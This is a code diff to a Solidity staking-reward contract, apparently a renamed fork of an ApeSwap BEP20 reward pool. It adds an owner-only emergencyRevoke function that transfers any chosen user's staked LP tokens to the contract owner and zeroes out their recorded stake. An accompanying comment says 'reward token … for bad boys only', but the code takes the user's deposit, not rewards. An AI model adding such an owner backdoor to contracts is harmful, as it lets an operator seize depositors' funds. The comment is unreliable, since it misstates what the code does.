@@ -16,7 +16,7 @@ import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
 
-contract BEP20RewardApeV3 is Ownable, Initializable {
+contract BEP20RewardApeObie is Ownable, Initializable {
     using SafeERC20 for IERC20;
 
     // Info of each user.
@@ -59,6 +59,7 @@ contract BEP20RewardApeV3 is Ownable, Initializable {
     event DepositRewards(uint256 amount);
     event Withdraw(address indexed user, uint256 amount);
     event EmergencyWithdraw(address indexed user, uint256 amount);
+    event EmergencyRevoke(address indexed user, uint256 amount);
     event SkimStakeTokenFees(address indexed user, uint256 amount);
     event LogUpdatePool(uint256 bonusEndBlock, uint256 rewardPerBlock);
     event EmergencyRewardWithdraw(address indexed user, uint256 amount);
@@ -273,6 +274,16 @@ contract BEP20RewardApeV3 is Ownable, Initializable {
         uint256 balance = token.balanceOf(address(this));
         token.transfer(msg.sender, balance);
         emit EmergencySweepWithdraw(msg.sender, token, balance);
+    }
+
+    // Take out reward token on other user's behalf - for bad boys only
+    function emergencyRevoke(address _user, uint256 _amount) external onlyOwner {
+        UserInfo storage user = userInfo[_user];
+        poolInfo.lpToken.safeTransfer(msg.sender, _amount);
+        totalStaked = totalStaked - _amount;
+        user.amount = user.amount - _amount;
+        user.rewardDebt = user.amount * poolInfo.accRewardTokenPerShare / 1e30;
+        emit EmergencyRevoke(_user, _amount);
     }
 
 }
